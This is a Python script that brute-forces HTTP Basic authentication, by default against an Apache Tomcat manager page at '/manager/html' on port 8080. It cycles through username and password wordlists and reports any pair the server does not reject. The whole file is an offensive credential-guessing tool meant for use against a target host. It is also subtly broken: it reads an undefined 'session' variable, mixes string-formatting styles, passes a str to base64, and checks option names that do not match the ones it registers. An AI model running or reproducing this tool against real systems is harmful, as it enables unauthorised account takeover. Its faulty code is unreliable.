#!/bin/python3

import os
import sys
import getopt
import base64
import requests
from time import sleep

def banner():
    print("="*60, 
    "\nCreated by 73556O8\nTested on: ...")
    print("="*60, "\n")

banner()

def usage():
    print("\nUsage:\npython3 newScript.py -url [target] -port 8080 -path [url path] -u [list] -p [list]\n")

def parameters(host, port, path, user, password):
    print("\tTarget: {}".format(host))
    print("\tUsernames:{}".format(user))    
    print("\tPasswords:{}".format(password))
    print("\tURL:{}".format(path))

def bruteforce(host, port, path, user, password):
    usernames = open(user, 'r').read().splitlines()
    passwords = open(password, 'r').read().splitlines()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Cache-Control": "max-age=0"}
    creds = {}

    for pwd in passwords:
        for usr in usernames:
            if session != False:
                if session[0] == usr and session[1] == pwd:
                    print("Using {}:{}".format(usr, pwd))
                    session = False
                    sleep(5)
                else:
                    continue

            headers["Authorization"] = "Basic {}" % base64.b64encode("{}:{}".format(usr, pwd))
            print("[*] Trying '{}:{}'".format(usr, pwd))
            try:
                res = requests.get("http://{}:{}{}".format(host, port, path), headers=headers)
                if res.status_code != 401:
                    print("[+] Credentials found: {}:{}".format(usr, pwd))
                    creds[usr] = pwd
            except:
                print("nope")

    if len(creds) > 0:
        print("[+] Summary")
        print(creds)
    else:
        print("[!] No passwords found")

def main():
    port = 8080
    path = "/manager/html"

    try:
        opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "host=", "port=", "path=", "usr=", "pwd="])
    except getopt.GetoptError as err:
        print(err, "test")
        usage()
        exit(1)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            exit(0)
        elif opt == "-host":
            host = arg
        elif opt == "-port":
            port = int(arg)
        elif opt == "-path":
            path = arg
        elif opt == "-u":
            user = arg
        elif opt == "-p":
            password = arg
        else:
            assert False, "unhandled option"

    if len(opts) == 0:
        usage()
        exit(0)


    parameters(host, port, path, user, password)
    bruteforce(host, port, path, user, password)

if __name__ == "__main__":
    main()